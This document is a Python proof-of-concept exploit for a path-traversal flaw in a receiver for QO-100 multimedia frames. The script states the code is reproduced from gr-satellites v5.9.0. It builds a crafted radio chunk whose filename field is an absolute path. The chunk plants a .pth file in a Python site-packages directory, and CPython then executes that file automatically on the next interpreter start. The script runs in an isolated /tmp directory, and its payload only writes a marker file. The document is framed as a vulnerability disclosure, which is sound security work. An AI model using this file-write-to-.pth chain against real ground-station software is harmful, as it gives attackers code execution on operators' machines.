#!/usr/bin/env python3
"""F4 end-to-end PoC: arbitrary file write -> .pth auto-execution -> RCE.

Reimplements the vulnerable `FileReceiverQO100Multimedia.file_id()` and
`FileReceiver._new_file()` paths from gr-satellites v5.9.0 (commit
f663ee4) VERBATIM, then drives them with a single crafted QO-100
multimedia chunk whose 50-byte ASCII filename slice is an absolute
path pointing at a Python user-site `.pth` autoload directory.

The PoC isolates itself entirely from the host's real Python
installation by using `PYTHONUSERBASE=/tmp/F4ub`, so a fresh
"user-site-packages" location is materialised under /tmp and the host
~/.local is never touched. Lines later: a child `python3` invocation
exports the same env var so CPython's `site` module scans the
isolated location, finds the planted `.pth`, and executes it.

If everything works the file `/tmp/RCE_MARKER` will be created by the
attacker payload BEFORE any user code runs in the child interpreter,
proving end-to-end RCE.

Pipeline:
    crafted RF frame
      |
      v
    file_id(chunk)              -- returns the attacker-controlled path
                                   (unpatched; ASCII slice not sanitized)
      |
      v
    _new_file(fid)              -- composes Path(receiver_base) / fid
                                   absolute rhs wins; result is the
                                   attacker's path, not inside the
                                   receiver base
      |
      v
    File.__init__(path)         -- open(path, 'wb')
      |
      v
    chunk_data written          -- .pth payload lands on disk
      |
      v
    PYTHONUSERBASE=... python3  -- site.py scans isolated user-site,
                                   finds o.pth, exec()s the
                                   import-prefixed line -> /tmp/RCE_MARKER

Run directly:
    python3 poc_F4_rce_e2e.py
"""

import os
import pathlib
import shutil
import subprocess
import sys


# =============================================================================
# Verbatim from src/python/filereceiver/qo100_multimedia.py (pre-F4 fix)
# =============================================================================
class FileReceiverQO100Multimedia:
    """Vulnerable subset — only the chunk accessors that file_id() reads."""

    def chunk_sequence(self, chunk):
        return int(chunk[0]) | ((int(chunk[1]) >> 6) << 8)

    def frame_type(self, chunk):
        return int(chunk[1]) & 0x0f

    def file_id(self, chunk):
        if self.chunk_sequence(chunk) != 0:
            return None
        try:
            name = (str(chunk[2:52], encoding='ascii')
                    .rstrip('\x00')
                    .replace('\x00', ' '))
        except Exception as e:
            print('Could not obtain filename:', e)
            return None
        if self.frame_type(chunk) in [3, 4, 5]:
            name += '.zip'
        return name


# =============================================================================
# Verbatim from src/python/filereceiver/filereceiver.py (pre-F4 fix)
# =============================================================================
class File:
    def __init__(self, path):
        self.path = path
        mode = 'r+b' if path.exists() else 'wb'
        self.f = open(path, mode)


class FileReceiver:
    def __init__(self, path):
        self._path = pathlib.Path(path)

    def filename(self, fid):
        return fid

    def _new_file(self, fid):
        # The single vulnerable line: Path composition with an
        # absolute rhs discards the lhs; with a `../` rhs it traverses.
        f = File(self._path / self.filename(fid))
        return f


# =============================================================================
# Exploit
# =============================================================================
USERBASE = '/tmp/F4ub'
PY_MAJMIN = f'python{sys.version_info[0]}.{sys.version_info[1]}'
PTH_TARGET = f'{USERBASE}/lib/{PY_MAJMIN}/site-packages/o.pth'
RECEIVER_BASE = '/tmp/grs_recv'
MARKER_PATH = '/tmp/RCE_MARKER'

# .pth files are processed by site.addpackage(). Lines starting with
# `import ` or `import\t` are passed through to exec() of the full line.
# Semicolons let us pack the marker-write into a single import-prefixed
# line.
PAYLOAD = (
    f'import os, sys; '
    f'open({MARKER_PATH!r}, "w").write('
    f'"RCE-EXECUTED-IN-PYTHON pid=" + str(os.getpid()) '
    f'+ " exe=" + sys.executable '
    f'+ " argv=" + repr(sys.argv) + "\\n")'
)


def craft_chunk(filename, payload):
    """Build a QO-100 multimedia chunk that lands `payload` at
    `filename` when fed to FileReceiverQO100Multimedia + FileReceiver."""

    # chunk[0]:    low byte of sequence (=0)
    # chunk[1]:    bits 6-7 = seq high (must be 0)
    #              bits 4-5 = frame_status (2 = last chunk)
    #              bits 0-3 = frame_type   (0 = not zip)
    #              -> 0b00_10_0000 = 0x20
    # chunk[2:52]: 50-byte ASCII filename, null-padded
    # chunk[54:57]: 3-byte file size (big-endian)
    # chunk[57:]:   payload data
    head = bytearray(57)
    head[0] = 0x00
    head[1] = 0x20

    fname_bytes = filename.encode('ascii')
    assert len(fname_bytes) <= 50, (
        f'filename is {len(fname_bytes)}B, but the QO-100 multimedia '
        f'chunk only carries 50 bytes for the filename slice; trim the '
        f'target path or change USERBASE.')
    head[2:2+len(fname_bytes)] = fname_bytes

    payload_bytes = payload.encode('ascii')
    size = len(payload_bytes)
    head[54] = (size >> 16) & 0xff
    head[55] = (size >> 8) & 0xff
    head[56] = size & 0xff

    return bytes(head) + payload_bytes


def setup_environment():
    """Prepare the isolated user-site dir and the receiver base."""
    # Wipe and recreate so reruns start from a clean slate.
    if os.path.exists(USERBASE):
        shutil.rmtree(USERBASE)
    if os.path.exists(MARKER_PATH):
        os.unlink(MARKER_PATH)
    os.makedirs(f'{USERBASE}/lib/{PY_MAJMIN}/site-packages', exist_ok=True)
    os.makedirs(RECEIVER_BASE, exist_ok=True)


def main():
    setup_environment()

    print('=' * 70)
    print(' F4 end-to-end RCE PoC — gr-satellites v5.9.0')
    print(' (path traversal -> .pth auto-execution chain)')
    print('=' * 70)
    print()
    print(f'[*] Receiver base dir:  {RECEIVER_BASE}')
    print(f'[*] Isolated USERBASE:  {USERBASE}')
    print(f'[*] Attacker target:    {PTH_TARGET}')
    print(f'[*] RCE marker (post):  {MARKER_PATH}')
    print(f'[*] Payload bytes:      {len(PAYLOAD)}')
    print()

    chunk = craft_chunk(PTH_TARGET, PAYLOAD)
    print(f'[*] Crafted chunk:      {len(chunk)} bytes')
    print(f'    filename slice:     '
          f'{chunk[2:52].rstrip(bytes([0])).decode("ascii")!r}')
    print(f'    payload preview:    {chunk[57:107]!r} ...')
    print()

    fr = FileReceiver(RECEIVER_BASE)
    fr_qo = FileReceiverQO100Multimedia()

    # Step 1: file_id() — returns the attacker-controlled string verbatim
    fid = fr_qo.file_id(chunk)
    print(f'[1] file_id(chunk) returned: {fid!r}')
    if fid is None or '/' not in fid:
        print('[FAIL] file_id() did not pass through the path string',
              file=sys.stderr)
        sys.exit(2)

    # Step 2: _new_file() — Path composition + open(path, 'wb')
    f = fr._new_file(fid)
    print(f'[2] _new_file() opened:      {f.path!s}')
    print(f'    resolved:                {f.path.resolve()!s}')
    print(f'    inside receiver base?    '
          f'{str(f.path.resolve()).startswith(RECEIVER_BASE + "/")}')

    # Step 3: write the payload to the file (verbatim from filereceiver)
    payload_bytes = chunk[57:]
    f.f.write(payload_bytes)
    f.f.close()
    print(f'[3] Wrote {len(payload_bytes)} bytes to {f.path}')

    # Step 4: assert the .pth landed in the isolated user-site
    if not os.path.exists(PTH_TARGET):
        print(f'[FAIL] .pth did not land at {PTH_TARGET}', file=sys.stderr)
        sys.exit(3)
    print(f'[4] .pth file present at:    {PTH_TARGET}')
    print(f'    size:                    {os.path.getsize(PTH_TARGET)} bytes')
    print(f'    contents:                {open(PTH_TARGET).read()[:80]!r} ...')
    print()

    # Step 5: trigger CPython's site.py to scan our isolated user-site,
    # find o.pth, and exec the import-prefixed line.
    print('[5] Triggering child python3 with PYTHONUSERBASE set ...')
    env = dict(os.environ, PYTHONUSERBASE=USERBASE)
    proc = subprocess.run(
        ['python3', '-c', 'pass'],
        env=env, capture_output=True, timeout=10)
    print(f'    child python3 -c pass exited {proc.returncode}')
    if proc.stderr:
        print(f'    stderr: {proc.stderr.decode("ascii", errors="replace")[:200]}')
    print()

    # Step 6: assert the marker file was created by the .pth payload
    if not os.path.exists(MARKER_PATH):
        print(f'[FAIL] marker {MARKER_PATH} not created — payload did '
              f'not execute', file=sys.stderr)
        sys.exit(4)

    with open(MARKER_PATH) as m:
        marker = m.read().rstrip('\n')
    print(f'[6] Marker file created at:  {MARKER_PATH}')
    print(f'    contents:                {marker}')
    print()
    print('=' * 70)
    print(' [PASS] F4 chain confirmed end-to-end:')
    print('        arbitrary file write (file_id() returns attacker path)')
    print('          -> .pth lands in a site-packages directory')
    print('            -> CPython site.py auto-execs on next python3')
    print('              -> attacker code runs as the operator user')
    print()
    print(' CVSS 3.1 (validated): AV:A/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H')
    print('                       = 8.4 High')
    print('=' * 70)


if __name__ == '__main__':
    main()
